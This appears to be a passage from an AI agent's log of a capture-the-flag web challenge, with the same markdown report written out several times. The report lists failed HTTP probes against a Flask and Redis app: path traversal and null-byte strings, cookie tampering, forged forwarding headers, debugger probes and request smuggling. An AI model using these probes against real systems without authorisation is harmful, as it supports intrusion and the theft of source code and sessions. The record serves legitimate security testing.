++- 表单/content-type：缺字段、空表单、JSON、text/plain、form body + JSON content-type 均为 400，无 debug/source 泄露；multipart、chunked、CL+TE、HTTP/1.0、Expect: 100-continue 均按普通表单处理并 302。重复字段能正常提交，但未形成新写入 primitive。
++- Cookie/session 边界：空值、无签名、坏签名、多点号、quoted cookie、逗号、路径穿越样式、长 cookie 都 fail closed，服务端发新 signed UUID，无 stack trace。重复 `session` cookie 时 Werkzeug 取后一个值；有效值在后则认证有效，有效值在前/无效值在后则退回新匿名 session。这只是解析规则，未给出签名绕过或 Redis 写入。
++- 反射/XSS：用户名中的 `<img ...>"&'` 在 welcome 页被转义为 `&lt;...&gt;&#34;&amp;&#39;`，无 cookie 注入或 XSS 边路。
++- vhost/proxy/cache：`Host: 127.0.0.1` 仅返回平台/openresty 空 502；`X-Forwarded-Host/Proto/For`、`X-Original-URL`、`X-Rewrite-URL` 未改变 Flask 路由或 redirect host。动态页 `Cache-Control: no-cache`；静态查询响应不被 openresty 共享缓存，重复请求均 `X-Cache: MISS` 且 Set-Cookie 不复用。
++- 静态/source 泄露：`/static/../app.py`、encoded traversal、off-by-slash alias、path params、null byte、带 query 的 traversal 均 404 或 openresty 400。`/static/css/default.css` 无 query 时由 openresty 缓存返回 1301-byte 2019 CSS；带 query 时走 Flask static，返回另一个 5690-byte CSS 并 Set-Cookie，但内容无 `secret/Redis/pickle/flag/app =/Flask/password` 等敏感关键词，未形成读取应用源文件能力。
++- Werkzeug debugger probes `?__debugger__=yes&cmd=resource&f=...` 返回普通页面，无 debugger/resource 泄露。
++### 命令和结果
++- `curl -i /`, `/login`, `/register`: 200，登录/注册页；`Set-Cookie: session=<uuid>.<sig>`；登录后 `/` 显示 `Welcome,<username>` 和注释 `<!--没错就是这么简洁~Red*s-->`。
++- `curl -i -X OPTIONS /login`: `200 OK`, `Allow: HEAD, GET, POST, OPTIONS`。`TRACE /login`: openresty `405 Not Allowed`。`PUT /login`: Flask `405 Method Not Allowed`。
++- Python requests content-type sweep against `/register` and `/login`: missing/empty/JSON/text/plain/form-json mismatch -> 400; multipart/duplicate fields/charset/bad percent -> 302 normal flow; no traceback/source body.
++- Cookie sweep:
++  - `Cookie: session=abc`, `abc.def`, `a.b.c.d`, `1111....`, `!!!!`, quoted, comma, long -> 200 login page with newly issued `session=<uuid>.<sig>`.
++  - Duplicate order: `session=invalid; session=<valid>` kept authenticated session; `session=<valid>; session=invalid` produced fresh anonymous session.
++- Proxy/header probes:
++  - `Host: 127.0.0.1 /register` -> `502 Bad Gateway` empty body from platform proxy.
++  - `X-Forwarded-Host: attacker.test` on POST `/register` -> 302 `Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/`.
++  - `X-Original-URL`/`X-Rewrite-URL` ignored.
++- Static/path probes:
++  - `/static/css/default.css` -> 200 len 1301, `X-Cache: HIT`, no Set-Cookie.
++  - `/static/css/default.css?x=1` -> 200 len 5690, `X-Cache: MISS`, Set-Cookie; no sensitive keywords.
++  - `/static../app.py`, `/static..%2fapp.py`, `/static/%2e%2e/app.py`, `/static/css/%2e%2e/%2e%2e/app.py?x=1` -> 404.
++  - `/static/css/default.css%00.py` -> openresty 400.
++- Cache repeat test on `/static/css/materialize.min.css?branch_cache_repeat=<rand>` three times: all `X-Cache: MISS`, each with different Set-Cookie, so no shared cached session fixation.
++### 结论
++当前 HTTP edge-case 分支未发现可行 primitive。没有可用的 HTTP-side 任意 Redis 写、session id 签名绕过、session/source/secret 泄露、debugger 泄露或缓存共享 Set-Cookie。建议主线不要在这些具体边界上重复投入；后续只保留“发现新的真实 HTTP sink/功能点”或“从题目/平台外部获得真实 Redis/session/secret 连接信息”两类方向。
+
+diff --git a/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md b/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..2c41e1180dc420e6fc2d4c3c40ed11712b2a747c
+--- /dev/null
++++ b/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md
+@@ -0,0 +1,32 @@
++## Branch Result
++direction: http-edge-write-leaks
++subagent_id: branch_003
++status: INFEASIBLE
++### 发现
++- 基础页面行为：`/`、`/login` 均返回登录页并设置 `session=<uuid>.<sig>`；正常注册/登录后 cookie UUID 不变，`/` 反射 `Welcome,<username>`，HTML 注释仅提示 `Red*s`。
++- 方法边界：`OPTIONS /login` 显示 `HEAD, GET, POST, OPTIONS`；`TRACE` 被 openresty 拦截为 405；`PUT` 到 Flask 405；`X-HTTP-Method-Override` 不生效。
++- 表单/content-type：缺字段、空表单、JSON、text/plain、form body + JSON content-type 均为 400，无 debug/source 泄露；multipart、chunked、CL+TE、HTTP/1.0、Expect: 100-continue 均按普通表单处理并 302。重复字段能正常提交，但未形成新写入 primitive。
++- Cookie/session 边界：空值、无签名、坏签名、多点号、quoted cookie、逗号、路径穿越样式、长 cookie 都 fail closed，服务端发新 signed UUID，无 stack trace。重复 `session` cookie 时 Werkzeug 取后一个值；有效值在后则认证有效，有效值在前/无效值在后则退回新匿名 session。这只是解析规则，未给出签名绕过或 Redis 写入。
++- 反射/XSS：用户名中的 `<img ...>"&'` 在 welcome 页被转义为 `&lt;...&gt;&#34;&amp;&#39;`，无 cookie 注入或 XSS 边路。
++- vhost/proxy/cache：`Host: 127.0.0.1` 仅返回平台/openresty 空 502；`X-Forwarded-Host/Proto/For`、`X-Original-URL`、`X-Rewrite-URL` 未改变 Flask 路由或 redirect host。动态页 `Cache-Control: no-cache`；静态查询响应不被 openresty 共享缓存，重复请求均 `X-Cache: MISS` 且 Set-Cookie 不复用。
++- 静态/source 泄露：`/static/../app.py`、encoded traversal、off-by-slash alias、path params、null byte、带 query 的 traversal 均 404 或 openresty 400。`/static/css/default.css` 无 query 时由 openresty 缓存返回 1301-byte 2019 CSS；带 query 时走 Flask static，返回另一个 5690-byte CSS 并 Set-Cookie，但内容无 `secret/Redis/pickle/flag/app =/Flask/password` 等敏感关键词，未形成读取应用源文件能力。
++- Werkzeug debugger probes `?__debugger__=yes&cmd=resource&f=...` 返回普通页面，无 debugger/resource 泄露。
++### 命令和结果
++- `curl -i /`, `/login`, `/register`: 200，登录/注册页；`Set-Cookie: session=<uuid>.<sig>`；登录后 `/` 显示 `Welcome,<username>` 和注释 `<!--没错就是这么简洁~Red*s-->`。
++- `curl -i -X OPTIONS /login`: `200 OK`, `Allow: HEAD, GET, POST, OPTIONS`。`TRACE /login`: openresty `405 Not Allowed`。`PUT /login`: Flask `405 Method Not Allowed`。
++- Python requests content-type sweep against `/register` and `/login`: missing/empty/JSON/text/plain/form-json mismatch -> 400; multipart/duplicate fields/charset/bad percent -> 302 normal flow; no traceback/source body.
++- Cookie sweep:
++  - `Cookie: session=abc`, `abc.def`, `a.b.c.d`, `1111....`, `!!!!`, quoted, comma, long -> 200 login page with newly issued `session=<uuid>.<sig>`.
++  - Duplicate order: `session=invalid; session=<valid>` kept authenticated session; `session=<valid>; session=invalid` produced fresh anonymous session.
++- Proxy/header probes:
++  - `Host: 127.0.0.1 /register` -> `502 Bad Gateway` empty body from platform proxy.
++  - `X-Forwarded-Host: attacker.test` on POST `/register` -> 302 `Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/`.
++  - `X-Original-URL`/`X-Rewrite-URL` ignored.
++- Static/path probes:
++  - `/static/css/default.css` -> 200 len 1301, `X-Cache: HIT`, no Set-Cookie.
++  - `/static/css/default.css?x=1` -> 200 len 5690, `X-Cache: MISS`, Set-Cookie; no sensitive keywords.
++  - `/static../app.py`, `/static..%2fapp.py`, `/static/%2e%2e/app.py`, `/static/css/%2e%2e/%2e%2e/app.py?x=1` -> 404.
++  - `/static/css/default.css%00.py` -> openresty 400.
++- Cache repeat test on `/static/css/materialize.min.css?branch_cache_repeat=<rand>` three times: all `X-Cache: MISS`, each with different Set-Cookie, so no shared cached session fixation.
++### 结论
++当前 HTTP edge-case 分支未发现可行 primitive。没有可用的 HTTP-side 任意 Redis 写、session id 签名绕过、session/source/secret 泄露、debugger 泄露或缓存共享 Set-Cookie。建议主线不要在这些具体边界上重复投入；后续只保留“发现新的真实 HTTP sink/功能点”或“从题目/平台外部获得真实 Redis/session/secret 连接信息”两类方向。
+
+codex
+Wrote [branch_result_branch_003.md](/home/stw/ctf-agent/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md) with status `INFEASIBLE`.
+
+No concrete HTTP-side Redis/session/source/secret write or leak primitive was found.
+diff --git a/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md b/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..2c41e1180dc420e6fc2d4c3c40ed11712b2a747c
+--- /dev/null
++++ b/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md
+@@ -0,0 +1,32 @@
++## Branch Result
++direction: http-edge-write-leaks
++subagent_id: branch_003
++status: INFEASIBLE
++### 发现
++- 基础页面行为：`/`、`/login` 均返回登录页并设置 `session=<uuid>.<sig>`；正常注册/登录后 cookie UUID 不变，`/` 反射 `Welcome,<username>`，HTML 注释仅提示 `Red*s`。
++- 方法边界：`OPTIONS /login` 显示 `HEAD, GET, POST, OPTIONS`；`TRACE` 被 openresty 拦截为 405；`PUT` 到 Flask 405；`X-HTTP-Method-Override` 不生效。
++- 表单/content-type：缺字段、空表单、JSON、text/plain、form body + JSON content-type 均为 400，无 debug/source 泄露；multipart、chunked、CL+TE、HTTP/1.0、Expect: 100-continue 均按普通表单处理并 302。重复字段能正常提交，但未形成新写入 primitive。
++- Cookie/session 边界：空值、无签名、坏签名、多点号、quoted cookie、逗号、路径穿越样式、长 cookie 都 fail closed，服务端发新 signed UUID，无 stack trace。重复 `session` cookie 时 Werkzeug 取后一个值；有效值在后则认证有效，有效值在前/无效值在后则退回新匿名 session。这只是解析规则，未给出签名绕过或 Redis 写入。
++- 反射/XSS：用户名中的 `<img ...>"&'` 在 welcome 页被转义为 `&lt;...&gt;&#34;&amp;&#39;`，无 cookie 注入或 XSS 边路。
++- vhost/proxy/cache：`Host: 127.0.0.1` 仅返回平台/openresty 空 502；`X-Forwarded-Host/Proto/For`、`X-Original-URL`、`X-Rewrite-URL` 未改变 Flask 路由或 redirect host。动态页 `Cache-Control: no-cache`；静态查询响应不被 openresty 共享缓存，重复请求均 `X-Cache: MISS` 且 Set-Cookie 不复用。
++- 静态/source 泄露：`/static/../app.py`、encoded traversal、off-by-slash alias、path params、null byte、带 query 的 traversal 均 404 或 openresty 400。`/static/css/default.css` 无 query 时由 openresty 缓存返回 1301-byte 2019 CSS；带 query 时走 Flask static，返回另一个 5690-byte CSS 并 Set-Cookie，但内容无 `secret/Redis/pickle/flag/app =/Flask/password` 等敏感关键词，未形成读取应用源文件能力。
++- Werkzeug debugger probes `?__debugger__=yes&cmd=resource&f=...` 返回普通页面，无 debugger/resource 泄露。
++### 命令和结果
++- `curl -i /`, `/login`, `/register`: 200，登录/注册页；`Set-Cookie: session=<uuid>.<sig>`；登录后 `/` 显示 `Welcome,<username>` 和注释 `<!--没错就是这么简洁~Red*s-->`。
++- `curl -i -X OPTIONS /login`: `200 OK`, `Allow: HEAD, GET, POST, OPTIONS`。`TRACE /login`: openresty `405 Not Allowed`。`PUT /login`: Flask `405 Method Not Allowed`。
++- Python requests content-type sweep against `/register` and `/login`: missing/empty/JSON/text/plain/form-json mismatch -> 400; multipart/duplicate fields/charset/bad percent -> 302 normal flow; no traceback/source body.
++- Cookie sweep:
++  - `Cookie: session=abc`, `abc.def`, `a.b.c.d`, `1111....`, `!!!!`, quoted, comma, long -> 200 login page with newly issued `session=<uuid>.<sig>`.
++  - Duplicate order: `session=invalid; session=<valid>` kept authenticated session; `session=<valid>; session=invalid` produced fresh anonymous session.
++- Proxy/header probes:
++  - `Host: 127.0.0.1 /register` -> `502 Bad Gateway` empty body from platform proxy.
++  - `X-Forwarded-Host: attacker.test` on POST `/register` -> 302 `Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/`.
++  - `X-Original-URL`/`X-Rewrite-URL` ignored.
++- Static/path probes:
++  - `/static/css/default.css` -> 200 len 1301, `X-Cache: HIT`, no Set-Cookie.
++  - `/static/css/default.css?x=1` -> 200 len 5690, `X-Cache: MISS`, Set-Cookie; no sensitive keywords.
++  - `/static../app.py`, `/static..%2fapp.py`, `/static/%2e%2e/app.py`, `/static/css/%2e%2e/%2e%2e/app.py?x=1` -> 404.
++  - `/static/css/default.css%00.py` -> openresty 400.
++- Cache repeat test on `/static/css/materialize.min.css?branch_cache_repeat=<rand>` three times: all `X-Cache: MISS`, each with different Set-Cookie, so no shared cached session fixation.
++### 结论
++当前 HTTP edge-case 分支未发现可行 primitive。没有可用的 HTTP-side 任意 Redis 写、session id 签名绕过、session/source/secret 泄露、debugger 泄露或缓存共享 Set-Cookie。建议主线不要在这些具体边界上重复投入；后续只保留“发现新的真实 HTTP sink/功能点”或“从题目/平台外部获得真实 Redis/session/secret 连接信息”两类方向。
+
+tokens used
+81,255
+Wrote [branch_result_branch_003.md](/home/stw/ctf-agent/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md) with status `INFEASIBLE`.
+
+No concrete HTTP-side Redis/session/source/secret write or leak primitive was found.
